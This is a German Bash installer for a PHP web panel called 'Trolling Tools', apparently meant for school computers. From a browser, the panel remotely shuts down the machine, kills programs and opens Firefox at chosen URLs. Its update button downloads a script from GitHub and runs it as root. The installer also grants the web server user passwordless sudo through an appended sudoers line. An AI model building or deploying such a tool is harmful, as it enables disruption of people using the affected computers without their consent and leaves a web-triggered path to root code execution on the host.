#!/bin/bash

# Sicherstellen, dass das Skript mit Root-Rechten ausgeführt wird
if [ "$EUID" -ne 0 ]; then
    echo "Bitte führe das Skript mit Root-Rechten aus (sudo)."
    exit
fi

INSTALL_DIR="/var/www/html/trolling"
KEY_FILE="$INSTALL_DIR/key.txt"

# Funktion für Installation
install_trolling_tool() {
    echo "==> Installation wird gestartet..."
    read -p "Bitte setze einen sicheren Schlüssel: " key
    mkdir -p "$INSTALL_DIR"
    echo "$key" > "$KEY_FILE"

    echo "==> Apache und PHP werden installiert..."
    apt update
    apt install -y apache2 php libapache2-mod-php
    echo "==> Apache und PHP wurden erfolgreich installiert."

    setup_website
    configure_permissions
}

# Funktion für Update
update_trolling_tool() {
    echo "==> Update wird gestartet..."
    if [ ! -f "$KEY_FILE" ]; then
        echo "Fehler: Key-Datei nicht gefunden. Bitte installiere die Software neu."
        exit 1
    fi

    setup_website
    configure_permissions
    echo "==> Update abgeschlossen."
}

# Funktion für das Einrichten der Webseite
setup_website() {
    cat <<EOL > "$INSTALL_DIR/index.php"
<?php
\$keyFile = __DIR__ . '/key.txt';
\$storedKey = trim(file_get_contents(\$keyFile));

if (\$_POST['key'] !== \$storedKey) {
    echo <<<HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
    </head>
    <body style="text-align: center; font-family: Arial, sans-serif; margin-top: 50px;">
        <h1>Bitte Schlüssel eingeben</h1>
        <form method="POST">
            <input type="password" name="key" placeholder="Schlüssel" required>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    HTML;
    exit;
}

if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['action'])) {
    \$action = \$_POST['action'];
    \$response = '';

    switch (\$action) {
        case 'shutdown':
            exec('sudo shutdown -h now');
            \$response = "PC wird heruntergefahren.";
            break;

        case 'killall':
            \$program = escapeshellarg(\$_POST['program'] ?? '');
            exec("sudo killall \$program");
            \$response = "Alle Instanzen von \$program wurden beendet.";
            break;

        case 'open_firefox':
            \$display = escapeshellarg(\$_POST['display'] ?? ':0');
            \$url = escapeshellarg(\$_POST['url'] ?? 'https://example.com');
            exec("export DISPLAY=\$display && firefox \$url &");
            \$response = "Firefox mit \$url auf Display \$display geöffnet.";
            break;

        case 'update':
            exec('curl -s https://raw.githubusercontent.com/Terrocraft/ScoolTrolingBash/main/installer.sh -o installer.sh');
            exec('sudo bash installer.sh');
            exec('2');
            \$response = "Update erfolgreich durchgeführt.";
            break;

        default:
            \$response = "Unbekannte Aktion.";
            break;
    }
    echo "<script>alert('\$response');</script>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trolling Tools</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background-color: #3b4048;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #61dafb;
            color: #282c34;
            cursor: pointer;
        }
        button:hover {
            background-color: #21a1f1;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Trolling Tools</h1>
        <form method="POST">
            <button name="action" value="shutdown">PC Shutdown</button><br>
            <label for="program">Programmname (killall):</label>
            <input type="text" name="program" id="program" placeholder="Programmname">
            <button name="action" value="killall">Killall</button><br>
            <label for="display">Display:</label>
            <input type="text" name="display" id="display" placeholder=":0" value=":0">
            <label for="url">URL:</label>
            <input type="text" name="url" id="url" placeholder="https://example.com">
            <button name="action" value="open_firefox">Open Firefox</button><br>
            <button name="action" value="update">Update Tool</button>
        </form>
    </div>
</body>
</html>
EOL
}

# Funktion für Berechtigungen
configure_permissions() {
    chown -R www-data:www-data "$INSTALL_DIR"
    chmod -R 755 "$INSTALL_DIR"
    echo "www-data ALL=(ALL) NOPASSWD: /sbin/shutdown, /usr/bin/killall, /path/to/this/script" >> /etc/sudoers
    systemctl restart apache2
}

# Benutzerabfrage für Auswahl
echo "Bitte wähle eine Option:"
echo "1. Installiere Trolling-Tool"
echo "2. Update Trolling-Tool"
read -p "Wähle 1 oder 2: " option

case "$option" in
    1)
        install_trolling_tool
        ;;
    2)
        update_trolling_tool
        ;;
    *)
        echo "Ungültige Auswahl. Bitte wähle 1 oder 2."
        exit 1
        ;;
esac
